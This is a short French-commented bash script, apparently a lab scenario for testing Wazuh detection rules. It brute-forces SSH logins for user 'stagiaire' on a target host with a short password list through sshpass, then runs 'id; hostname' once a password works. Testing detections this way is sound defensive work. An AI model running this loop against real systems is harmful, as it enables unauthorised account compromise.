#!/bin/bash
# Scénario 4 — Force brute SSH (MITRE T1110.001) puis connexion réussie (T1078 / T1021.004)
# Attendu : règles Wazuh natives 5710/5712/5760 puis 100130 (connexion après force brute)
CIBLE=${CIBLE:-cible}
for p in 123456 password stagiaire azerty stagiaire2025 bienvenue stagiaire2026; do
  if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password stagiaire@"$CIBLE" 'id; hostname' 2>/dev/null; then
    echo "[!] Accès SSH obtenu avec : $p"; break
  else echo "  échec : $p"; fi
done
